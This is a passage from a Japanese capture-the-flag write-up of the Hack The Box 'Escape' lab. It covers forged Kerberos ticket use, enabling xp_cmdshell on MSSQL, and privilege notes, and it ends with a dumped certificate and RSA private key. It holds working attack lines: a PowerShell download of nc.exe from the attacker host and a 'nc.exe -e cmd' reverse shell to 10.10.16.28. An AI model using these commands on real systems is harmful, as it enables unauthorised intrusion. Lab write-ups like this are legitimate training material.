cf78315005425db0415cc461175ac62346b865244ab3869594377e15f266b196af056aef70a4a005304bec0c4a02693bd47a8b27e59db57df72d70305aabe5d204f413830ba93b26027c054940f24eb48f1194b720bde59bc65d5fb2bf4686235e05683143214d492e3b4198862e49df1de8705f75658d0e34c8e9
[*] Decoding unencrypted data in credential[0]['ticket']:
[*]   Service Name                : test/dc.sequel.htb
[*]   Service Realm               : SEQUEL.HTB
[*]   Encryption type             : rc4_hmac (etype 23)
[*] Decoding credential[0]['ticket']['enc-part']:
[*]   LoginInfo                   
[*]     Logon Time                : 26/10/2025 00:44:54 AM
[*]     Logoff Time               : Infinity (absolute time)
[*]     Kickoff Time              : Infinity (absolute time)
[*]     Password Last Set         : 26/10/2025 00:44:54 AM
[*]     Password Can Change       : Infinity (absolute time)
[*]     Password Must Change      : Infinity (absolute time)
[*]     LastSuccessfulILogon      : Infinity (absolute time)
[*]     LastFailedILogon          : Infinity (absolute time)
[*]     FailedILogonCount         : 0
[*]     Account Name              : test
[*]     Full Name                 : 
[*]     Logon Script              : 
[*]     Profile Path              : 
[*]     Home Dir                  : 
[*]     Dir Drive                 : 
[*]     Logon Count               : 500
[*]     Bad Password Count        : 0
[*]     User RID                  : 500
[*]     Group RID                 : 513
[*]     Group Count               : 5
[*]     Groups                    : 513, 512, 520, 518, 519
[*]     Groups (decoded)          : (513) Domain Users
[*]                                 (512) Domain Admins
[*]                                 (520) Group Policy Creator Owners
[*]                                 (518) Schema Admins
[*]                                 (519) Enterprise Admins
[*]     User Flags                : (0) 
[*]     User Session Key          : 00000000000000000000000000000000
[*]     Logon Server              : 
[*]     Logon Domain Name         : SEQUEL.HTB
[*]     Logon Domain SID          : S-1-5-21-4078382237-1492182817-2568127209
[*]     User Account Control      : (528) USER_NORMAL_ACCOUNT, USER_DONT_EXPIRE_PASSWORD
[*]     Extra SID Count           : 0
[*]     Extra SIDs                :
[*]     Resource Group Domain SID :
[*]     Resource Group Count      : 0
[*]     Resource Group Ids        : 
[*]     LMKey                     : 0000000000000000
[*]     SubAuthStatus             : 0
[*]     Reserved3                 : 0
[*]   ClientName                  
[*]     Client Id                 : 26/10/2025 00:44:54 AM
[*]     Client Name               : test
[*]   Attributes Info             
[*]     Flags                     : (1) PAC_WAS_REQUESTED
[*]   Requestor Info              
[*]     UserSid                   : S-1-5-21-4078382237-1492182817-2568127209-500
[*]   ServerChecksum              
[*]     Signature Type            : hmac_md5
[*]     Signature                 : c4ead6b5e8eb0d7cf8424a2d2c888609
[*]   KDCChecksum                 
[*]     Signature Type            : hmac_md5
[*]     Signature                 : 5ab4c349f4678f39b7d3227b140b802b
```
作成したチケットでmssqlにログイン成功！
```sh
└─$ echo '10.129.80.180 dc.sequel.htb' | sudo tee -a /etc/hosts
10.129.80.180 dc.sequel.htb
```
```sh
└─$ export KRB5CCNAME=test.ccache

└─$ impacket-mssqlclient -k dc.sequel.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sequel\Administrator  dbo@master)> 
```
step3でも確認したが、xp_cmdshellは無効になっているもよう  
しかしadministratorになりすまししているため、有効化が可能であった
```sh
SQL (sequel\Administrator  dbo@master)> xp_cmdshell whoami
ERROR(DC\SQLMOCK): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.

SQL (sequel\Administrator  dbo@master)> sp_configure 'show advanced options', 1
INFO(DC\SQLMOCK): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL (sequel\Administrator  dbo@master)> RECONFIGURE

SQL (sequel\Administrator  dbo@master)> sp_configure 'xp_cmdshell', 1
INFO(DC\SQLMOCK): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.

SQL (sequel\Administrator  dbo@master)> RECONFIGURE

SQL (sequel\Administrator  dbo@master)> xp_cmdshell whoami
output           
--------------   
sequel\sql_svc   

NULL 
```
xp_cmdshell経由で実行するnc.exeを配送する
```sh
└─$ cp /usr/share/windows-resources/binaries/nc.exe .                             

└─$ impacket-smbserver share . -smb2support                                   
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
xp_cmdshellでnc.exeを実行
```sh
SQL (sequel\Administrator  dbo@master)> xp_cmdshell "powershell /c Invoke-Webrequest http://10.10.16.28/nc.exe -outfile c:\users\sql_svc\documents\nc.exe"
output   
------   
NULL

SQL (sequel\Administrator  dbo@master)> xp_cmdshell "cmd /c c:\users\sql_svc\documents\nc.exe -e cmd 10.10.16.28 4444"
^C
```
リバースシェル取得！  
winrmでログインしたときとは異なって、`SeImpersonatePrivilege`権限が有効になっていることを確認  
ということで、ポテト系の権限昇格も可能
```sh
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.28] from (UNKNOWN) [10.129.80.180] 52962
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /all
whoami /all

USER INFORMATION
----------------

User Name      SID                                           
============== ==============================================
sequel\sql_svc S-1-5-21-4078382237-1492182817-2568127209-1106


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                                             Attributes                                        
========================================== ================ =============================================================== ==================================================
Everyone                                   Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                       Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
NT SERVICE\MSSQL$SQLMOCK                   Well-known group S-1-5-80-3352489819-4000206481-1934998105-2023371924-4240525201 Enabled by default, Enabled group, Group owner    
LOCAL                                      Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                                        Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                                                      


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

ERROR: Unable to get user claims information.
```


## おまけ
```sh
└─$ openssl pkcs12 -in administrator.pfx -passin pass:'' -info -nodes
MAC: sha256, Iteration 2048
MAC length: 32, salt length: 8
PKCS7 Data
Certificate bag
Bag Attributes
    friendlyName: 
    localKeyID: F9 DA D2 42 43 ED 85 80 79 A5 DA 3A 5F 26 F2 02 6E 96 C5 28 
subject=CN=Ryan.cooper
issuer=DC=htb, DC=sequel, CN=sequel-DC-CA
-----BEGIN CERTIFICATE-----
MIIF4DCCBMigAwIBAgITHgAAABEQNHvqrtc1XwAAAAAAETANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjUxMDI1MTExMzEzWhcNMzUxMDIz
MTExMzEzWjAWMRQwEgYDVQQDEwtSeWFuLmNvb3BlcjCCASIwDQYJKoZIhvcNAQEB
BQADggEPADCCAQoCggEBALqsFdps6r+snahDis3f3/E8WxFXaq4djqqvv7xHENug
AqIELTToIPXd17ZiK+aVV6tg6DTw2JPkWZhVk1wgOAsSUo9wNAp0GR22l21apHcj
Fl5/EopbuFMbFs8jpcOGNVD9eoVgC+KSZ59en2V99Pnow2Peb3dMPPAMK/sKx6Pb
hUDdTGno8NVY5Lhyc/naqxYUVwZUNfxFsFeu8DEkrf0mWEFAvnXlS03d30fERbWf
KFrIzZKzDeK0j5m46mJ3wiPH7w3Bm9kRxO0bRZhqJjnfSmijq0reOHMbaTUw9fB2
OcYCgOQEY5AyREWIuroS8JxSZZWVCaGrkZCXrJT+mQ0CAwEAAaOCAvcwggLzMDMG
A1UdEQQsMCqgKAYKKwYBBAGCNxQCA6AaDBhhZG1pbmlzdHJhdG9yQHNlcXVlbC5o
dGIwHQYDVR0OBBYEFG52n2oS/g3q0TtzVLJfzuhRVVqLMB8GA1UdIwQYMBaAFGKf
MqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOggbCGga1sZGFw
Oi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVibGljJTIwS2V5
JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zZXF1
ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9vYmplY3RD
bGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEEgbAwga0wgaoG
CCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049QUlBLENOPVB1
YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRp
b24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xh
c3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTAOBgNVHQ8BAf8EBAMCBaAwPQYJKwYB
BAGCNxUHBDAwLgYmKwYBBAGCNxUIh6vzdoXcplaH/ZU1g7/DWYOJyjWBd9/KCIae
7CkCAWUCAQQwKQYDVR0lBCIwIAYIKwYBBQUHAwIGCCsGAQUFBwMEBgorBgEEAYI3
CgMEMDUGCSsGAQQBgjcVCgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYK
KwYBBAGCNwoDBDBEBgkqhkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggq
hkiG9w0DBAICAIAwBwYFKw4DAgcwCgYIKoZIhvcNAwcwDQYJKoZIhvcNAQELBQAD
ggEBAGMvcDJS+XwF2LN2n25U+5I2XyAJdaJV+v8OwRXGOGBlnPK0JkA/6RA5KxUN
7QyT3DeCSkkM4mYjzZXGInK/lvHpXEp/X5+GNZVkg5zZYjAg3KdYK5QjJeRw2pb/
KePpT8NGrQKLBXG47KMcA1rdLmDYND/hQKxqYcztuPGKe5/FBygC8ckZrWBDB4iq
fMlsMvotJdsy8BXImhAz2bzFBXY+bLR/Va6r8uTGXKim0N7KufCOfaDlSxJkVLhI
w3wYmT4mXdWbtB5F9DxfTu37JQEHku9K5gjw0ltGEZqjA4oS4XG2CPs2inhn2Edl
QVgO2tHaWLrKgr9yoH+gN3T71LI=
-----END CERTIFICATE-----
PKCS7 Data
Key bag
Bag Attributes
    friendlyName: 
    localKeyID: F9 DA D2 42 43 ED 85 80 79 A5 DA 3A 5F 26 F2 02 6E 96 C5 28 
Key Attributes: <No Attributes>
-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQC6rBXabOq/rJ2o
Q4rN39/xPFsRV2quHY6qr7+8RxDboAKiBC006CD13de2YivmlVerYOg08NiT5FmY
VZNcIDgLElKPcDQKdBkdtpdtWqR3IxZefxKKW7hTGxbPI6XDhjVQ/XqFYAvikmef
Xp9lffT56MNj3m93TDzwDCv7Csej24VA3Uxp6PDVWOS4cnP52qsWFFcGVDX8RbBX
rvAxJK39JlhBQL515UtN3d9HxEW1nyhayM2Ssw3itI+ZuOpid8Ijx+8NwZvZEcTt
G0WYaiY530poo6tK3jhzG2k1MPXwdjnGAoDkBGOQMkRFiLq6EvCcUmWVlQmhq5GQ
l6yU/pkNAgMBAAECggEAFmcpLz/jk3HasPM8MRWFaYz6C/R/DdrnwJXbj7PCsuz6
6+lO6JrUO9WuOgoBpUh2j0+PxqzB/UvKMeVRTFzkhPWjuWm4oSmKSx3bAgl/E/o+
yMP83GSCFF07qUvorLTKaMgnAGNEweIatA512Ecb07NK4c0z+PAKHzACxjvmtkQh
a8veN7+VjA4FSIoXImX4jigJ4C2UPs1knOS6lRXwxwkh+DjpC+wpIWSv6PbGpl8r
ETcL5/aERnY7k0MRkM5gHTObwYMsa2KDYcBPJWWyD2H+UMcbm1ow5yITPZjsdaYI
gADRhsFbUzhmtjSjwGMfJISCYBMhc/UGYgmPnt5i6QKBgQDlP17K/fwC72x9kTti
oH0GmHlmF9WiT5Aig2xvd/yEEQky29muB8Jqg9PcWqLhXan0A5fgAXe/oaIEM/VZ
3NNhV/+i0crYKN59ARFbCTF1Ywz20+z9GQ3L5y6GXqaFhk5rBI6V5qUH1eJwZXyO
PG2AQMiuKUzxSnqu965ujP4i5QKBgQDQdM2a/hkSRCom91MR4vGZpd9bQnhpVVAM
Bo1MqQdLZAyDha2WY06lReQdi7tfu7MeBCxTnSWWl+UEN3vZoSOesS7qZgCUdXoz
+DB06lAWEdqtQj0mKy5PKUfOOKTZpAjdnvMO+kBtPo5a4bycbF4E2rcZsQX23KOy
NEYW0jDzCQKBgDhtD6UBPP1v9xE1JRvSitOLxh3F8hSAZubH2HHbY7ESDGSTTpIS
YN0c05HiUUMNbd6c384ILnRhkWJdc5+JxhGoukhWQQpRjOnR0HbK3XyaQ7+hTCzD
9OxiW8ZBF9W3yCd5OKtW2PoDwDeQE0djQkSWLY8IpWKixW25kxqs44StAoGAbce1
qBR9e6MuV8sUkmzkM7ipQlRlOYPWXh7tNxwlXUzZUkKKQpMWDfAazHyUNzyQfhRQ
i9BMxVxFHc1iiiBUs/Q38vW5BHZB3zCrxEbJ2nWYpnol3f4Lq2DgEfi+yGecy6oz
8wVT/LRfH/mV7QMdGI1etEcIDxPvmZ/x8X7MjJECgYBD8recL9DADQZBJo/xEIMZ
Bhsla3stFGQeNMMMn7MTBWf6bFzgXcmzAjItS83UjOQJt+glR88b5nXjidXmtn0I
cDri0QM0uAAPs1iPV7OQmaiSe5ODdsD7CEDsQzJepLja6VmjGdFU1N1ILRgWM2ji
nt93DXuBYgFnL+WoZzeFIg==
-----END PRIVATE KEY-----
```
```sh
└─$ openssl pkcs12 -in administrator.pfx -out cert.crt -passin pass:'' -nokeys -clcerts

└─$ openssl x509 -in cert.crt -nocert -text                     
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            1e:00:00:00:11:10:34:7b:ea:ae:d7:35:5f:00:00:00:00:00:11
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: DC=htb, DC=sequel, CN=sequel-DC-CA
        Validity
            Not Before: Oct 25 11:13:13 2025 GMT
            Not After : Oct 23 11:13:13 2035 GMT
        Subject: CN=Ryan.cooper
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:ba:ac:15:da:6c:ea:bf:ac:9d:a8:43:8a:cd:df:
                    df:f1:3c:5b:11:57:6a:ae:1d:8e:aa:af:bf:bc:47:
                    10:db:a0:02:a2:04:2d:34:e8:20:f5:dd:d7:b6:62:
                    2b:e6:95:57:ab:60:e8:34:f0:d8:93:e4:59:98:55:
                    93:5c:20:38:0b:12:52:8f:70:34:0a:74:19:1d:b6:
                    97:6d:5a:a4:77:23:16:5e:7f:12:8a:5b:b8:53:1b:
                    16:cf:23:a5:c3:86:35:50:fd:7a:85:60:0b:e2:92:
                    67:9f:5e:9f:65:7d:f4:f9:e8:c3:63:de:6f:77:4c:
                    3c:f0:0c:2b:fb:0a:c7:a3:db:85:40:dd:4c:69:e8:
                    f0:d5:58:e4:b8:72:73:f9:da:ab:16:14:57:06:54:
                    35:fc:45:b0:57:ae:f0:31:24:ad:fd:26:58:41:40:
                    be:75:e5:4b:4d:dd:df:47:c4:45:b5:9f:28:5a:c8:
                    cd:92:b3:0d:e2:b4:8f:99:b8:ea:62:77:c2:23:c7:
                    ef:0d:c1:9b:d9:11:c4:ed:1b:45:98:6a:26:39:df:
                    4a:68:a3:ab:4a:de:38:73:1b:69:35:30:f5:f0:76:
                    39:c6:02:80:e4:04:63:90:32:44:45:88:ba:ba:12:
                    f0:9c:52:65:95:95:09:a1:ab:91:90:97:ac:94:fe:
                    99:0d
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Alternative Name: 
                othername: UPN:administrator@sequel.htb
            X509v3 Subject Key Identifier: 
                6E:76:9F:6A:12:FE:0D:EA:D1:3B:73:54:B2:5F:CE:E8:51:55:5A:8B
            X509v3 Authority Key Identifier: 
                62:9F:32:A3:A0:F0:38:20:D4:60:C0:CD:6D:C5:FA:51:30:5E:C3:15
            X509v3 CRL Distribution Points: 
                Full Name:
                  URI:ldap:///CN=sequel-DC-CA,CN=dc,CN=CDP,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=sequel,DC=htb?certificateRevocationList?base?objectClass=cRLDistributionPoint

            Authority Information Access: 
                CA Issuers - URI:ldap:///CN=sequel-DC-CA,CN=AIA,CN=Public%20Key%20Services,CN=Services,CN=Configuration,DC=sequel,DC=htb?cACertificate?base?objectClass=certificationAuthority
            X509v3 Key Usage: critical
                Digital Signature, Key Encipherment
            Microsoft certificate template: 
                0..&+.....7.....v...V...5...Y...5.w......)..e...
            X509v3 Extended Key Usage: 
                TLS Web Client Authentication, E-mail Protection, Microsoft Encrypted File System
            Microsoft Application Policies Extension: 
                0&0
..+.......0
..+.......0..
+.....7
..
            S/MIME Capabilities: 
......0...+....0050...*.H..
..*.H..
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        63:2f:70:32:52:f9:7c:05:d8:b3:76:9f:6e:54:fb:92:36:5f:
        20:09:75:a2:55:fa:ff:0e:c1:15:c6:38:60:65:9c:f2:b4:26:
        40:3f:e9:10:39:2b:15:0d:ed:0c:93:dc:37:82:4a:49:0c:e2:
        66:23:cd:95:c6:22:72:bf:96:f1:e9:5c:4a:7f:5f:9f:86:35:
        95:64:83:9c:d9:62:30:20:dc:a7:58:2b:94:23:25:e4:70:da:
        96:ff:29:e3:e9:4f:c3:46:ad:02:8b:05:71:b8:ec:a3:1c:03:
        5a:dd:2e:60:d8:34:3f:e1:40:ac:6a:61:cc:ed:b8:f1:8a:7b:
        9f:c5:07:28:02:f1:c9:19:ad:60:43:07:88:aa:7c:c9:6c:32:
        fa:2d:25:db:32:f0:15:c8:9a:10:33:d9:bc:c5:05:76:3e:6c:
        b4:7f:55:ae:ab:f2:e4:c6:5c:a8:a6:d0:de:ca:b9:f0:8e:7d:
        a0:e5:4b:12:64:54:b8:48:c3:7c:18:99:3e:26:5d:d5:9b:b4:
        1e:45:f4:3c:5f:4e:ed:fb:25:01:07:92:ef:4a:e6:08:f0:d2:
        5b:46:11:9a:a3:03:8a:12:e1:71:b6:08:fb:36:8a:78:67:d8:
        47:65:41:58:0e:da:d1:da:58:ba:ca:82:bf:72:a0:7f:a0:37:
        74:fb:d4:b2
```
```sh
└─$ openssl pkcs12 -in administrator.pfx -out privkey.pem -passin pass:'' -nocerts -nodes

└─$ openssl rsa -in privkey.pem -noout -text 
Private-Key: (2048 bit, 2 primes)
modulus:
    00:ba:ac:15:da:6c:ea:bf:ac:9d:a8:43:8a:cd:df:
    df:f1:3c:5b:11:57:6a:ae:1d:8e:aa:af:bf:bc:47:
    10:db:a0:02:a2:04:2d:34:e8:20:f5:dd:d7:b6:62:
    2b:e6:95:57:ab:60:e8:34:f0:d8:93:e4:59:98:55:
    93:5c:20:38:0b:12:52:8f:70:34:0a:74:19:1d:b6:
    97:6d:5a:a4:77:23:16:5e:7f:12:8a:5b:b8:53:1b:
    16:cf:23:a5:c3:86:35:50:fd:7a:85:60:0b:e2:92:
    67:9f:5e:9f:65:7d:f4:f9:e8:c3:63:de:6f:77:4c:
    3c:f0:0c:2b:fb:0a:c7:a3:db:85:40:dd:4c:69:e8:
    f0:d5:58:e4:b8:72:73:f9:da:ab:16:14:57:06:54:
    35:fc:45:b0:57:ae:f0:31:24:ad:fd:26:58:41:40:
    be:75:e5:4b:4d:dd:df:47:c4:45:b5:9f:28:5a:c8:
    cd:92:b3:0d:e2:b4:8f:99:b8:ea:62:77:c2:23:c7:
    ef:0d:c1:9b:d9:11:c4:ed:1b:45:98:6a:26:39:df:
    4a:68:a3:ab:4a:de:38:73:1b:69:35:30:f5:f0:76:
    39:c6:02:80:e4:04:63:90:32:44:45:88:ba:ba:12:
    f0:9c:52:65:95:95:09:a1:ab:91:90:97:ac:94:fe:
    99:0d
publicExponent: 65537 (0x10001)
privateExponent:
    16:67:29:2f:3f:e3:93:71:da:b0:f3:3c:31:15:85:
    69:8c:fa:0b:f4:7f:0d:da:e7:c0:95:db:8f:b3:c2:
    b2:ec:fa:eb:e9:4e:e8:9a:d4:3b:d5:ae:3a:0a:01:
    a5:48:76:8f:4f:8f:c6:ac:c1:fd:4b:ca:31:e5:51:
    4c:5c:e4:84:f5:a3:b9:69:b8:a1:29:8a:4b:1d:db:
    02:09:7f:13:fa:3e:c8:c3:fc:dc:64:82:14:5d:3b:
    a9:4b:e8:ac:b4:ca:68:c8:27:00:63:44:c1:e2:1a:
    b4:0e:75:d8:47:1b:d3:b3:4a:e1:cd:33:f8:f0:0a:
    1f:30:02:c6:3b:e6:b6:44:21:6b:cb:de:37:bf:95:
    8c:0e:05:48:8a:17:22:65:f8:8e:28:09:e0:2d:94:
    3e:cd:64:9c:e4:ba:95:15:f0:c7:09:21:f8:38:e9:
    0b:ec:29:21:64:af:e8:f6:c6:a6:5f:2b:11:37:0b:
    e7:f6:84:46:76:3b:93:43:11:90:ce:60:1d:33:9b:
    c1:83:2c:6b:62:83:61:c0:4f:25:65:b2:0f:61:fe:
    50:c7:1b:9b:5a:30:e7:22:13:3d:98:ec:75:a6:08:
    80:00:d1:86:c1:5b:53:38:66:b6:34:a3:c0:63:1f:
    24:84:82:60:13:21:73:f5:06:62:09:8f:9e:de:62:
    e9
prime1:
    00:e5:3f:5e:ca:fd:fc:02:ef:6c:7d:91:3b:62:a0:
    7d:06:98:79:66:17:d5:a2:4f:90:22:83:6c:6f:77:
    fc:84:11:09:32:db:d9:ae:07:c2:6a:83:d3:dc:5a:
    a2:e1:5d:a9:f4:03:97:e0:01:77:bf:a1:a2:04:33:
    f5:59:dc:d3:61:57:ff:a2:d1:ca:d8:28:de:7d:01:
    11:5b:09:31:75:63:0c:f6:d3:ec:fd:19:0d:cb:e7:
    2e:86:5e:a6:85:86:4e:6b:04:8e:95:e6:a5:07:d5:
    e2:70:65:7c:8e:3c:6d:80:40:c8:ae:29:4c:f1:4a:
    7a:ae:f7:ae:6e:8c:fe:22:e5
prime2:
    00:d0:74:cd:9a:fe:19:12:44:2a:26:f7:53:11:e2:
    f1:99:a5:df:5b:42:78:69:55:50:0c:06:8d:4c:a9:
    07:4b:64:0c:83:85:ad:96:63:4e:a5:45:e4:1d:8b:
    bb:5f:bb:b3:1e:04:2c:53:9d:25:96:97:e5:04:37:
    7b:d9:a1:23:9e:b1:2e:ea:66:00:94:75:7a:33:f8:
    30:74:ea:50:16:11:da:ad:42:3d:26:2b:2e:4f:29:
    47:ce:38:a4:d9:a4:08:dd:9e:f3:0e:fa:40:6d:3e:
    8e:5a:e1:bc:9c:6c:5e:04:da:b7:19:b1:05:f6:dc:
    a3:b2:34:46:16:d2:30:f3:09
exponent1:
    38:6d:0f:a5:01:3c:fd:6f:f7:11:35:25:1b:d2:8a:
    d3:8b:c6:1d:c5:f2:14:80:66:e6:c7:d8:71:db:63:
    b1:12:0c:64:93:4e:92:12:60:dd:1c:d3:91:e2:51:
    43:0d:6d:de:9c:df:ce:08:2e:74:61:91:62:5d:73:
    9f:89:c6:11:a8:ba:48:56:41:0a:51:8c:e9:d1:d0:
    76:ca:dd:7c:9a:43:bf:a1:4c:2c:c3:f4:ec:62:5b:
    c6:41:17:d5:b7:c8:27:79:38:ab:56:d8:fa:03:c0:
    37:90:13:47:63:42:44:96:2d:8f:08:a5:62:a2:c5:
    6d:b9:93:1a:ac:e3:84:ad
exponent2:
    6d:c7:b5:a8:14:7d:7b:a3:2e:57:cb:14:92:6c:e4:
    33:b8:a9:42:54:65:39:83:d6:5e:1e:ed:37:1c:25:
    5d:4c:d9:52:42:8a:42:93:16:0d:f0:1a:cc:7c:94:
    37:3c:90:7e:14:50:8b:d0:4c:c5:5c:45:1d:cd:62:
    8a:20:54:b3:f4:37:f2:f5:b9:04:76:41:df:30:ab:
    c4:46:c9:da:75:98:a6:7a:25:dd:fe:0b:ab:60:e0:
    11:f8:be:c8:67:9c:cb:aa:33:f3:05:53:fc:b4:5f:
    1f:f9:95:ed:03:1d:18:8d:5e:b4:47:08:0f:13:ef:
    99:9f:f1:f1:7e:cc:8c:91
coefficient:
    43:f2:b7:9c:2f:d0:c0:0d:06:41:26:8f:f1:10:83:
    19:06:1b:25:6b:7b:2d:14:64:1e:34:c3:0c:9f:b3:
    13:05:67:fa:6c:5c:e0:5d:c9:b3:02:32:2d:4b:cd:
    d4:8c:e4:09:b7:e8:25:47:cf:1b:e6:75:e3:89:d5:
    e6:b6:7d:08:70:3a:e2:d1:03:34:b8:00:0f:b3:58:
    8f:57:b3:90:99:a8:92:7b:93:83:76:c0:fb:08:40:
    ec:43:32:5e:a4:b8:da:e9:59:a3:19:d1:54:d4:dd:
    48:2d:18:16:33:68:e2:9e:df:77:0d:7b:81:62:01:
    67:2f:e5:a8:67:37:85:22
```
